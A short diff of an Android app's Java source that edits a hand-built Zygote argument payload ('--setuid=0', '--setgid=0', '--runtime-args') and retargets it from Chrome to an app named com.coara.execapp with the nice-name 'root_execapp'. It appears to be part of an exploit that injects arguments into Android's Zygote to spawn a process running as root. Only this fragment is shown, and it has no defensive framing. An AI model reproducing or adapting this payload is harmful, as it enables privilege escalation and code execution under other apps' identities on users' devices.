@@ -270,10 +270,10 @@ public class MainActivity extends AppCompatActivity {
             payload.append("--runtime-args\n");
             payload.append("--setuid=0\n");
             payload.append("--setgid=0\n");
-            payload.append("--target-sdk-version=29\n");
-            payload.append("--nice-name=root_chrome\n");
-            payload.append("--app-data-dir=/data/data/com.android.chrome\n");
-            payload.append("--package-name=com.android.chrome\n");
+            payload.append("--target-sdk-version=28\n");
+            payload.append("--nice-name=root_execapp\n");
+            payload.append("--app-data-dir=/data/data/com.coara.execapp\n");
+            payload.append("--package-name=com.coara.execapp\n");
             payload.append("android.app.ActivityThread\n");
 
             // 遅延エントリ（カンマ区切りで空エントリを追加）
